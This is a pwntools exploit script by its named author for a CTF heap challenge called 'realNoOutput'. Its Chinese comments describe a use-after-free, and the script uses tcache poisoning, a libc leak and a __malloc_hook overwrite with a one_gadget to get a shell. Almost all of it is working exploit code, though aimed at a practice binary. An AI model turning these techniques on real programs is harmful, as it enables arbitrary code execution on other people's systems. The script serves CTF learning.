# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
#context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './realNoOutput'
elf = ELF(binary)
libc = elf.libc
#libc = ELF('')
context.binary = binary
DEBUG = 1
if DEBUG:
    p = process(binary)
    libc = elf.libc
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '25921'
    p = remote(host,port)
l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda            : int( p.recv(14)[2:] , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sl(str(num))

def add(id,size,text):
    cmd(1)
    sl(str(id))
    sl(str(size))
    se(text)
    sleep(0.2)

def delete(id):
    cmd(2)
    sl(str(id))
    sleep(0.2)

def edit(id,text):
    cmd(3)
    sl(str(id))
    se(text)
    sleep(0.2)

def show(index):
    cmd(4)
    sl(str(index))
    sleep(0.2)

one_gad = one_gadget(libc.path)

#本题没有将栈上保存的变量操作后清0，而是在下一次操作时更新，更新失败时导致uaf

add(0,0x80,"a"*0x80)
add(1,0x80,"a"*0x80)

delete(0) #此时栈上保存了该地址

for i in range(6):
    add(8,0xd0,"a")  #此时ptr_list[0]=0xd0
    edit(0,"a"*0x10) #ptr_list[1]=0xd0 判断失败不更新指针
    delete(0) #ptr_list[1]=0xd0 判断失败不更新指针
#填满tcache

delete(1)
add(9, 0xc0, "a") #此时ptr_list[1]=0xc0
show(1) #ptr_list[1]=0xc0 判断失败不更新指针

__malloc_hook = l64() - 224 - 0x10
lg("__malloc_hook",__malloc_hook)

libc.address = __malloc_hook - libc.sym["__malloc_hook"]
ogg = one_gad[1] + libc.address

add(0, 0x80, p64(__malloc_hook)) #常规tcache循环指针利用
add(0, 0x80, "a")
add(0, 0x80, p64(ogg))


p.interactive()

'''
@File    :   realNoOutput.py
@Time    :   2021/08/01 09:19:35
@Author  :   Niyah 
'''